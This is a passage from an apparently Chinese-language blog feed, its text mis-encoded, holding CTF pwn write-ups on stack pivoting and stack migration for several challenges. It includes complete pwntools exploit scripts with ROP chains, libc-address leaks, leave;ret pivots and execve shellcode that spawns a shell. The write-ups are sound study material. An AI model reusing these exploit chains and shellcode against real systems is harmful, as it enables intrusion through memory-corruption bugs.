srcset="/img/loading.gif" alt="-w358"></p><h4 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ol><li>åœ¨ç¬¬ä¸€ä¸ªreadçš„æ—¶å€™ï¼Œç›´æ¥æŠŠæ„é€ çš„ropé“¾è¯»è¿›å»ã€‚ä»»åŠ¡åˆ†åˆ«æ˜¯leak ä¸€ä¸ªå‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ¥ç”¨libcseacherç®—å‡ºsystemï¼Œè·Ÿ/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¿”å›startå‡½æ•°æ¸…ç†æ ˆå¼€å¯ç¬¬äºŒæ¬¡ä½¿ç”¨æ¼æ´ï¼› call systemï¼ˆ/bin/shï¼‰</li><li>ç„¶åç¬¬äºŒä¸ªreadæ—¶å€™ï¼ŒæŠŠæ§ebpæŒ‡å‘å›ºå®šåœ°å€sçš„åœ°å€ï¼Œretaddress æ”¾ä¸Šleaveçš„gadgetã€‚</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;from LibcSearcher import *e = ELF(&#39;./spwn&#39;)io = process(&#39;./spwn&#39;)# libc = e.libcio = remote(&#39;node3.buuoj.cn&#39;,28527)padding = 24s = 0x0804A300fake1 = 0x0804A500leave_ret = 0x08048511puts_add = e.symbols[&#39;puts&#39;]write_plt = e.symbols[&#39;write&#39;]write_got = e.got[&#39;write&#39;]io.recvuntil(&#39;name?&#39;)p = flat([fake1,write_plt,0x080483A0,1,write_got,10])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)# raw_input(&#39;-&gt;&#39;)io.send(p)write_add = u32(io.recv(4))print(hex(write_add))obj = LibcSearcher(&#39;write&#39;,write_add)libc_base = write_add - obj.dump(&#39;write&#39;) #libc.symbols[&#39;write&#39;]print(hex(obj.dump(&#39;write&#39;)))print(hex(libc_base))sys_add = libc_base + obj.dump(&#39;system&#39;) #libc.symbols[&#39;system&#39;]binsh_add =libc_base + obj.dump(&#39;str_bin_sh&#39;) #libc.search(&#39;/bin/sh\x00&#39;).next()io.recvuntil(&#39;name?&#39;)p = flat([fake1,sys_add,0x080483A0,binsh_add])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)io.send(p)io.interactive()</code></pre><h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-2"><a href="#æŸ¥ä¿æŠ¤å’Œarch-2" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ï¿¼ï¿¼ï¿¼ï¿¼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­å¯ä»¥çœ‹åˆ°åé¢çš„readå¤„ï¼Œå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œä½†æ˜¯åªæœ‰ä¸€ä¸ªgadgetå¯ä»¥ç”¨ï¼Œéœ€è¦è€ƒè™‘Stack Migrationã€‚å…¶ä¸­é‚£ä¸ª<strong>sub400a1a</strong>å‡½æ•°æ˜¯é—®ä½ éœ€è¦ç•™ä¸‹å¤šå°‘çš„å­—èŠ‚ï¼Œè‚¯å®šè¦<code>0xe0</code>ï¼Œæ‰€ä»¥å†é€è¿‡å»çš„æ—¶å€™å°±å¡«å…¥0xe0ï¼Œæ­£å¥½åšå‚æ•°ç»™ä¸‹é¢readå‡½æ•°ç”¨ã€‚</p><p>ç„¶åç¨‹åºæ¥å—åˆ°0xe0åï¼Œè¿›å…¥ifè¯­å¥ä¸­ï¼Œä¼šè¾“å‡ºä¸€ä¸‹å †æ ˆespçš„å€¼ï¼Œè¿™ä¸‹ä¹Ÿæ˜¯ç›¸å½“äºçŸ¥é“äº†ä¸€ä¸ªç‰¹å®šçš„åœ°å€ï¼Œç„¶åå°±æ­£å¸¸æ„é€ ropé“¾ï¼ŒæŠŠæ§ebpç­‰äºä¸ºæ¥æ”¶åˆ°çš„stack espï¼Œå†è·Ÿä¸Šleava gadgetå³å¯ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ACTF_2019_babystack&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27626)io = remote(&#39;challenge-848a378609341016.sandbox.ctfhub.com&#39;, 24656)elf = ELF(&#39;./ACTF_2019_babystack&#39;)# libc = elf.libcio.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x000400ad3start_addr = 0x000400800leave_ret = 0x400a18 payload = flat([&#39;\x00&#39;*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(208,&#39;a&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)libc_start_main_addr = u64(io.recv(6).ljust(8,&#39;\x00&#39;)) #- libc.symbols[&#39;__libc_start_main&#39;]obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_base))io.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)rec = libc_base + 0x4f2c5payload = flat([&#39;\x00&#39;*8,rec])payload = payload.ljust(208,&#39;\x00&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰</title>
    <link href="/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/"/>
    <url>/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰"><a href="#èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰" class="headerlink" title="èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰"></a>èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬äººåˆšå­¦pwnä¸ä¹…ï¼Œæœ€è¿‘åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å­¦åˆ°äº†å„ç§éœ€è¦æ ˆå¸§è°ƒèŠ‚çš„é¢˜ç›®ï¼Œä»¥æ­¤è®°å½•ä¸€ä¸‹ã€‚<br>åœ¨ä¸€äº›æ ˆæº¢å‡ºçš„ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä¼šç¢°åˆ°ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚æº¢å‡ºçš„å¯æ§å­—èŠ‚æ•°å¤ªå°‘ï¼Œæ— æ³•æ„é€ æˆ‘ä»¬æƒ³è¦çš„ropé“¾ï¼Œç¨‹åºASLRå¼€å¯åå¯¼è‡´çš„æ ˆåœ°å€ä¸å¯é¢„æµ‹ç­‰ã€‚å¯¹äºè¿™ç§é—®é¢˜ï¼Œå¸¸ç”¨çš„æ€è·¯åŒ…æ‹¬ï¼š</p><ul><li>åŠ å‡espå€¼ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆ</li><li>Stack Migrationæ¥æ„é€ ä¸€ä¸ªå‡çš„æ ˆå¸§ã€‚</li></ul><p>è¿™é‡Œæ€»ç»“äº†2ç§é¢˜å‹ï¼š</p><h2 id="åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ"><a href="#åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ" class="headerlink" title="åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ"></a>åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ</h2><p>è¿™ç§é¢˜å‹å°±éœ€è¦ç”¨Ropgadgetæ‰¾ä¸€ä¸ªæ§åˆ¶espçš„gadgetï¼Œç„¶åç®€å•ä¿®æ”¹espå€¼çš„å¤§å°ï¼Œæ¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚</p><h3 id="Alictf-016-vss"><a href="#Alictf-016-vss" class="headerlink" title="Alictf_016_vss"></a>Alictf_016_vss</h3><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯ä¸€ä¸ªä¿®æ”¹espæ‰©å¤§æ ˆç©ºé—´ï¼Œä»è€Œæ„é€ ropé“¾è·å–shellçš„é¢˜ç›®ã€‚</p><h4 id="æ£€æŸ¥ä¿æŠ¤å’Œarch"><a href="#æ£€æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤å’Œarch"></a>æ£€æŸ¥ä¿æŠ¤å’Œarch</h4><p><img src="http://qiqianyun.chumen77.xyz/15808931260368.jpg" srcset="/img/loading.gif" alt="-w446"></p><h4 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p>ç”±äºè¿™ä¸ªç¨‹åºä½¿ç”¨é™æ€ç¼–è¯‘å’Œstripå‘½ä»¤å‰¥ç¦»ç¬¦å·ï¼Œç”¨idaæ‰“å¼€æ²¡æœ‰æˆ‘ä»¬å¹³æ—¶çœ‹çš„é‚£ä¹ˆç®€å•ï¼Œ<br>å¾ˆå¤šå‡½æ•°å·²ç»æ— æ³•è¯†åˆ«ï¼Œæˆ‘ä»¬å°±éœ€è¦è‡ªå·±è°ƒè¯•ï¼Œç„¶åæ¨æµ‹æ˜¯ä»€ä¹ˆå‡½æ•°ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>startå‡½æ•°ä¸­ï¼Œcallçš„å‡½æ•°æ˜¯__libc_start_main, ä¸Šä¸€è¡Œçš„ offsetåˆ™æ˜¯mainå‡½æ•°<br>é‚£ä¸ªç®­å¤´å°±æ˜¯mainå‡½æ•°äº†ã€‚è¿›å…¥mainå‡½æ•°ä»¥åï¼Œ<strong>å¯ä»¥ç»è¿‡syscallä¸­raxçš„å‚æ•°æ¥ç¡®è®¤å…¶æ˜¯ä»€ä¹ˆå‡½æ•°</strong>ï¼Œå¾ˆæ˜æ˜¾ä¸€ä¸ªå‡½æ•°æ˜¯alarmå‡½æ•°ï¼Œå…ˆæ‰‹åŠ¨nopä¸€ä¸‹ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>æŠŠè¿™ä¸ªå‡½æ•°å»é™¤åï¼Œæ–¹ä¾¿gdbçš„åæœŸè°ƒè¯•ã€‚æ¥ç€å¯ä»¥å¾ˆå®¹æ˜“ç¡®å®šä¸€ä¸‹putså‡½æ•°è·Ÿreadå‡½æ•°ï¼Œåœ¨idaä¸­ä¿®æ”¹ä¸€ä¸‹ã€‚<img src="http://qiqianyun.chumen77.xyz/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>ä¸‹é¢é‚£ä¸ª40108eå‡½æ•°æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œæˆ‘ç”¨edbåŠ¨æ€è°ƒè¯•æ¥ç¡®å®šå‡ºå…¶ä¸­çš„æŸäº›å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>å¯¹äºè¿™ä¸ªå‡½æ•°ï¼Œå…ˆç¡®å®šä¸€ä¸‹å…¶å‚æ•°ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://qiqianyun.chumen77.xyz/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dumpè¿‡å»å°±ä¼šå‘ç°æ˜¯å¤åˆ¶äº†ä¸€ä»½ã€‚æ‰€ä»¥å°±ç¡®å®šè¿™ä¸ªå‡½æ•°æ˜¯<code>strncpy</code>æ˜¯å‡½æ•°ã€‚<br>å¯¹äºè¿™ä¸ªå‡½æ•°<code>char *strncpy(char *dest, const char *src, int n)</code><strong>å°†srcæŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­nä¸ªå­—ç¬¦å¤åˆ¶åˆ°destæŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­ï¼Œåœ¨ç¬¬ä¸€ä¸ªç©ºå­—ç¬¦å¤„åœæ­¢ï¼Œå¹¶è¿”å›è¢«å¤åˆ¶åçš„dest</strong>ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>å¯¹äºä¸‹ä¸€æ®µå°±æ˜¯åˆ¤æ–­ä¸€ä¸‹ï¼Œæ˜¯å¦ä¸0x79å’Œ0x70ç›¸ç­‰ï¼Œå¯ä»¥æ¥æ‰‹åŠ¨ä¿®æ”¹å€¼è®©å…¶ç›¸ç­‰ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>å¾€åèµ°ä¼šå‘ç°å…ˆæº¢å‡ºäº†ï¼Œåœ¨åšæº¢å‡ºé¢˜çš„æ—¶å€™çœ‹åˆ°return å°±åº”è¯¥æƒ³åŠæ³•æƒ³ä¸Šè·³ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>æº¢å‡ºçš„è¿™ä¸ªåœ°å€å°±æ˜¯åˆšåˆšåˆsyrcpyå‡½æ•°å¤åˆ¶è¿‡æ¥0x50å­—èŠ‚ä¸­çš„æœ€å8ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæ˜¯strncpyå‡½æ•°ï¼Œ<strong>æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯ä¸èƒ½æœ‰\x00</strong>ï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­ï¼Œä»è€Œæ— æ³•å¤åˆ¶æ»¡0x50å­—èŠ‚åˆ¶é€ å¯æ§æº¢å‡ºï¼Œæ‰€ä»¥å‰0x48ä¸ªå­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½å†™å…¥ä»»ä½•åœ°å€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹å°±éœ€è¦é€šè¿‡ä¿®æ”¹espæ¥å®Œæˆæ¼æ´åˆ©ç”¨ã€‚</p><p>åœ¨æœ€å‰é¢çš„readå‡½æ•°ä¸­ï¼Œç»™äº†ååˆ†å¤§çš„ç¼“å†²åŒºå¯ä»¥ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠROPé“¾æ”¾åœ¨0x50å­—èŠ‚ä¹‹åï¼Œç„¶åé€šè¿‡å¢åŠ espçš„å€¼æŠŠæ ˆé¡¶æŠ¬åˆ°ROPé“¾ä¸Šï¼Œç´§æ¥ç€æ‰§è¡Œè¿™ä¸ªropé“¾å³å¯ã€‚</p><p>æŸ¥åˆ°one_gadgetå‘ç°<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>æ­£å¥½ç¬¦åˆè¦æ±‚ã€‚ç„¶ågdbè°ƒè¯•ä¸€ä¸‹ç¡®å®šä¸€ä¸‹ropé“¾ä»50ä¸ªå­—èŠ‚åçš„é‚£é‡Œå¼€å§‹åˆé€‚å³å¯ã€‚<strong>ï¼ˆè¿™ä¸ªåœ¨æ‰¾onegadgetçš„æ—¶å€™æ³¨æ„ä¸è¦æŠŠrspææˆespäº†ï¼Œè‡ªå·±åœ¨åšçš„æ—¶å€™å› ä¸ºè¿™ä¸ªè°ƒè¯•äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯è¿™ä¸ªé”™è¯¯ï¼Œå¯¼è‡´expä¸æˆåŠŸï¼‰</strong></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *import timeio = process(&#39;./vss&#39;)e = ELF(&#39;./vss&#39;)io.recvuntil(&#39;Password:\n&#39;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [    pop_rax_ret,    0,    pop_rdi_ret,    0,    pop_rsi_ret,    bss,    pop_rdx_ret,    10,    syscall_ret,    pop_rax_ret,    0x3b,    pop_rdi_ret,    bss,    pop_rsi_ret,    0,    pop_rdx_ret,    0,    syscall_ret]# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;py&#39; + &#39;a&#39;*70 + p64(add_rsp_0x58_ret)+ &#39;b&#39;* 8 + &#39;&#39;.join(map(p64,rop1)))# raw_input(&#39;-&gt;&#39;)sleep(0.1)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>è¿™ä¸ªnxä¹Ÿæ²¡æœ‰å¼€ï¼Œå¯ä»¥ç”¨æ ˆæ‰§è¡Œshellcode</p><h4 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><pre><code>signed int vul(){  char s; // [esp+18h] [ebp-20h]  puts(&quot;\n======================&quot;);  puts(&quot;\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\n======================&quot;);  puts(&quot;What&#39;s your name?&quot;);  fflush(stdout);  fgets(&amp;s, 50, stdin);  printf(&quot;Hello %s.&quot;, &amp;s);  fflush(stdout);  return 1;}</code></pre><p>ä»£ç å¾ˆç®€å•ï¼Œä½†æ˜¯å¯ä»¥å‘ç°å¯ä»¥æº¢å‡ºçš„å­—èŠ‚åªæœ‰50-0x20-4=14ä¸ªå­—èŠ‚å¯æ§ï¼Œæ‰€ä»¥æ˜¯å¾ˆéš¾å†™å‡ºropé“¾æ¥è·å–å’±ä»¬ç›®çš„çš„ã€‚ç„¶åå°±å¯ä»¥è€ƒè™‘æ§åˆ¶æ ˆæŒ‡é’ˆçš„æ”»å‡»æ€è·¯ï¼Œå°±æ˜¯å…ˆæŠŠshellcodeæ‘†åœ¨æ ˆä¸Šï¼Œç„¶åæ§åˆ¶eipåˆ°è¾¾è¿™é‡Œå°±å¯ä»¥äº†ã€‚ä½†æ˜¯ç”±äºç¨‹åºæœ¬èº«ä¼šå¼€å¯ ASLR ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆéš¾ç›´æ¥çŸ¥é“ shellcode çš„åœ°å€ã€‚ä½†æ˜¯æ ˆä¸Šç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå¯¹ esp è¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘ shellcode å¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³ esp å¤„ã€‚</p><p>æ‰¾ä¸€ä¸‹æ§åˆ¶espçš„gadget<br>    0x08048504 : jmp esp<br>ç„¶åæ€ä¹ˆæ§åˆ¶eipåˆ°shellcodeä¸Šå‘¢ï¼Œå› ä¸ºæ²¡æœ‰nxä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µæŒ‡ä»¤æ¥æ§åˆ¶åç§»ï¼š</p><pre><code>sub esp,0x28jmp esp</code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *#io = process(&#39;./b0verfl0w&#39;)context.arch = &#39;i386&#39;io = remote(&#39;node3.buuoj.cn&#39;,29410)shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)jmp_esp = 0x08048504payload = shellcode + (36-len(shellcode_x86))*&#39;b&#39;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&#39;?\n&#39;)#raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>åœ¨ Stack Migration ä¸­ï¼Œæˆ‘ä»¬æ‰€åˆ©ç”¨çš„æŠ€å·§ä¾¿æ˜¯åŒæ—¶æ§åˆ¶ EBP ä¸ EIPï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„åŒæ—¶ï¼Œä¹Ÿæ”¹å˜ç¨‹åºæ ˆå¸§çš„ä½ç½®ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æˆ‘ä»¬çŸ¥é“åœ¨å‡½æ•°å»ºç«‹æ ˆå¸§æ—¶æœ‰ä¸¤æ¡æŒ‡ä»¤<code>push ebp; mov ebp, esp</code>ï¼Œè€Œé€€å‡ºæ—¶åŒæ ·éœ€è¦æ¶ˆé™¤è¿™ä¸¤æ¡æŒ‡ä»¤çš„å½±å“ï¼Œå³<code>leave(mov esp, ebp; pop ebp)</code> ã€‚ä¸”leaveä¸€èˆ¬ç´§è·Ÿç€å°±æ˜¯retã€‚<strong>å› æ­¤ï¼Œåœ¨å­˜åœ¨æ ˆæº¢å‡ºçš„ç¨‹åºä¸­ï¼Œåªè¦æˆ‘ä»¬èƒ½æ§åˆ¶åˆ°æ ˆä¸­çš„ebpï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸¤æ¬¡leaveåŠ«æŒæ ˆã€‚</strong></p><p><img src="http://qiqianyun.chumen77.xyz/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>ç¬¬ä¸€æ¬¡éšç€ç¨‹åºæµ<code>leave; ret</code>ï¼Œnew espä¸ºæˆ‘ä»¬æ„é€ æ–°æ ˆçš„ç›®æ ‡åœ°å€ã€‚ å¯ä»¥çœ‹åˆ°æ‰§è¡Œåˆ°retæ—¶ï¼Œespè¿˜åœ¨åŸæ¥çš„oldæ ˆä¸Šï¼Œè€Œebpå·²ç»æŒ‡å‘äº†æ–°çš„æ ˆçš„æ ˆé¡¶ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>ç¬¬äºŒæ¬¡è¿›å…¥æˆ‘ä»¬æ”¾å…¥æ ˆä¸Šçš„<code>leave; ret</code> çš„gadgetï¼ˆ<strong>è¿™ä¸ªæ˜¯æˆ‘ä»¬äº‹å…ˆå†™ä¸Šæ ˆçš„</strong>ï¼‰espå·²ç»è¢«æˆåŠŸåŠ«æŒåˆ°æ–°çš„æ ˆä¸Šï¼Œæ‰§è¡Œå®Œgadgetåæ ˆé¡¶ä¼š åœ¨new_esp-4(64ä½æ˜¯-8)çš„ä½ç½®ä¸Šã€‚æ­¤æ—¶æ ˆå®Œå…¨å¯æ§äº†ï¼Œé€šè¿‡é¢„å…ˆæˆ–è€…ä¹‹ååœ¨new stackä¸Šå¸ƒç½®çš„ropé“¾å¯ä»¥è½»æ¾å®Œæˆæ”»å‡»ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p><h3 id="HITCON-training-lab6-64ä½"><a href="#HITCON-training-lab6-64ä½" class="headerlink" title="HITCON_training_lab6_64ä½"></a>HITCON_training_lab6_64ä½</h3><p>è¿™ä¸ªæ˜¯åœ¨HITCON_trainingçš„ä¸€ä¸ªç»ƒä¹ ï¼Œç›´æ¥ç»™çš„æœ‰æºç ï¼Œæˆ‘ç»™ç¼–è¯‘æˆäº†64ä½ç‰ˆæœ¬ã€‚</p><h4 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h4><pre><code>#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> ç¼–è¯‘å‘½ä»¤</p><h4 id="ç®€å•åˆ†æ"><a href="#ç®€å•åˆ†æ" class="headerlink" title="ç®€å•åˆ†æ"></a>ç®€å•åˆ†æ</h4><p>è¿™ä¸ªé¢˜çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ çš„Stack Migrationç”¨çš„ï¼Œå¯ä»¥ä¸åˆ†æä»£ç ç›´æ¥ç”¨gdb-pedaç›´æ¥æ¥æµ‹è¯•ï¼š<br><img src="http://qiqianyun.chumen77.xyz/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://qiqianyun.chumen77.xyz/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>ç†Ÿæ‚‰çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯ä¸‹é¢å¤šå‡ºæ¥çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œä¹Ÿæ˜¯ç¨‹åºä¸èƒ½æ¥å—çš„éƒ¨åˆ†ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªéœ€è¦è€ƒè™‘æ ˆè¿ç§»çš„æ ‡å¿—ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>æ³¨æ„ä¸€ä¸‹rspè¢«è¦†ç›–çš„å€¼ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>è®¡ç®—paddingä¸º48.<br><img src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>è®¡ç®—ä¸€ä¸‹ï¼Œå¯ä»¥å¡«å…¥å¤šå°‘çš„å¯æ§å­—æ®µã€‚å»é™¤ä¸€ä¸‹åˆšåˆšç¨‹åºä¸èƒ½å­˜å…¥çš„éƒ¨åˆ†å’Œpaddingéƒ¨åˆ†ï¼Œè¿˜æœ‰80ä¸ªå­—èŠ‚å¯ä»¥ç”¨ã€‚å…¶ä¸­ä¸€ä¸ªæ¥ä¼ªé€ new espï¼Œå‰©ä¸‹ä¹Ÿå°±è¿˜æœ‰9ä¸ªgadgetå¯ä»¥ç”¨ï¼Œå¯ä»¥ç»™æˆ‘æ„é€ ç¬¬ä¸€ä¸ªropé“¾ã€‚</p><h4 id="å›¾è§£åˆ†æ"><a href="#å›¾è§£åˆ†æ" class="headerlink" 